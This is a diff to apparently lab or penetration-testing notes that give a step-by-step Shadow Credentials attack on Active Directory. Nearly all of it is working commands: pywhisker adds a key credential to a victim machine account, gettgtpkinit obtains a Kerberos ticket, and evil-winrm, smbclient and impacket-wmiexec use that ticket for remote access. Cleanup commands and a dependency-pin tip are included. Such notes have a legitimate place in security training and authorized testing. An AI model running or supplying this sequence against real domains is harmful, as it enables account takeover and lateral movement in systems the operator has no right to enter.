@@ -35,29 +35,29 @@ pip3 install oscrypto==1.3.0
 ```bash
 # 1. Add shadow credential to a target object
 # Requires write access to that object (check BloodHound for GenericWrite paths)
-python3 pywhisker.py -d <domain> -u <your_user> -p <your_pass> \
+python3 pywhisker.py -d $Domain -u $Username -p $Password \
   --target <victim_machine$> --action add
 # Output: saves a .pfx file and prints its password
 
 # 2. Get TGT via PKINIT
-python3 gettgtpkinit.py <domain>/<victim_machine$> out.ccache \
+python3 gettgtpkinit.py $Domain/<victim_machine$> out.ccache \
   -cert-pfx <pfx_file> -pfx-pass <pfx_password>
 
 # 3. Use the TGT
 export KRB5CCNAME=out.ccache
-evil-winrm -i <target> -r <domain>    # WinRM with Kerberos
-smbclient -k -N //<target>/C$         # SMB with Kerberos (no password needed)
-impacket-wmiexec -k <domain>/<machine$>@<target> --no-pass   # WMI
+evil-winrm -i $BoxIP -r $Domain    # WinRM with Kerberos
+smbclient -k -N //$BoxIP/C$         # SMB with Kerberos (no password needed)
+impacket-wmiexec -k $Domain/<machine$>@$BoxIP --no-pass   # WMI
 ```
 
 **List existing shadow credentials on an object:**
 ```bash
-python3 pywhisker.py -d <domain> -u <user> -p <pass> --target <machine$> --action list
+python3 pywhisker.py -d $Domain -u $Username -p $Password --target <machine$> --action list
 ```
 
 **Clean up (remove your shadow credential after use):**
 ```bash
-python3 pywhisker.py -d <domain> -u <user> -p <pass> --target <machine$> --action remove --device-id <id>
+python3 pywhisker.py -d $Domain -u $Username -p $Password --target <machine$> --action remove --device-id <id>
 ```
 
 > ⚠️ `oscrypto==1.3.0` pin is critical. Newer versions break gettgtpkinit.py with a `ValueError: required TLS connection info not available` error even when everything else is correct. Pin it first before running.
